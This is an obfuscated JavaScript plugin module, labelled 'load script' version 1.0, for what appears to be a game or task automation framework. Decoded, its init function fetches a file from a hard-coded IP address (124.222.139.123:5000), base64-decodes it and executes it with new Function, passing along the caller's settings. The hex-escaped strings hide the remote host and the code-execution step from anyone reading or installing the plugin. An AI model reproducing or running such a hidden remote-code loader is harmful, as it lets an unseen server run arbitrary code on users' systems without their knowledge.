const pluginName = '\u52a0\u8f7d\u811a\u672c', version = '\x31\x2e\x30';
let first = ![];
const getVersion = () => {
        return version;
    }, tips = async _0x518d21 => {
        await leo['\x6c\x6f\x67']('\u5df2\u6210\u529f\u52a0\u8f7d' + pluginName + '\u63d2\u4ef6\uff0c\u63d2\u4ef6\u7248\u672c\x5b' + version + '\x5d');
    }, init = async _0x2cad56 => {
        _0x2cad56['\x6a\x6f\x62'] = _0x2cad56['\x6a\x6f\x62'] ? _0x2cad56['\x6a\x6f\x62'] : '\x67\x67', leo['\x73\x65\x6e\x64\x47\x65\x74'] = (_0x102205, _0x2846af) => new Promise((_0x2dfe03, _0xee70a2) => {
            leo['\x72\x65\x71\x75\x65\x73\x74']['\x67\x65\x74']({
                '\x75\x72\x6c': _0x102205,
                '\x71\x73': _0x2846af
            }, function (_0x5eaa69, _0x4e6fab, _0x428813) {
                !_0x5eaa69 && _0x4e6fab['\x73\x74\x61\x74\x75\x73\x43\x6f\x64\x65'] == 0xc8 ? _0x2dfe03(_0x428813) : _0x2dfe03('\x7b\x22\x73\x74\x61\x74\x75\x73\x22\x3a\x22\x4e\x22\x2c\x22\x6d\x65\x73\x73\x61\x67\x65\x22\x3a\x22\x73\x74\x61\x74\x75\x73\x43\x6f\x64\x65\x3d' + _0x4e6fab['\x73\x74\x61\x74\x75\x73\x43\x6f\x64\x65'] + '\x22\x7d');
            });
        });
        let _0x51363c = '\x68\x74\x74\x70\x3a\x2f\x2f\x31\x32\x34\x2e\x32\x32\x32\x2e\x31\x33\x39\x2e\x31\x32\x33\x3a\x35\x30\x30\x30\x2f\x63\x67\x61\x2f\x6a\x6f\x62\x5f' + _0x2cad56['\x6a\x6f\x62'] + '\x2e\x6a\x73';
        const _0xe582a6 = await leo['\x73\x65\x6e\x64\x47\x65\x74'](_0x51363c);
        leo['\x63\x66'] = _0x51beb0 => new Function(Buffer['\x66\x72\x6f\x6d'](_0x51beb0, '\x62\x61\x73\x65\x36\x34')['\x74\x6f\x53\x74\x72\x69\x6e\x67']())();
        const _0x575c78 = leo['\x63\x66'](_0xe582a6);
        return _0x575c78(_0x2cad56);
    }, start = async _0x5bdf6d => {
        return !first && (first = !![], tips(cga)), init(_0x5bdf6d);
    };
module['\x65\x78\x70\x6f\x72\x74\x73'] = { '\x73\x74\x61\x72\x74': start };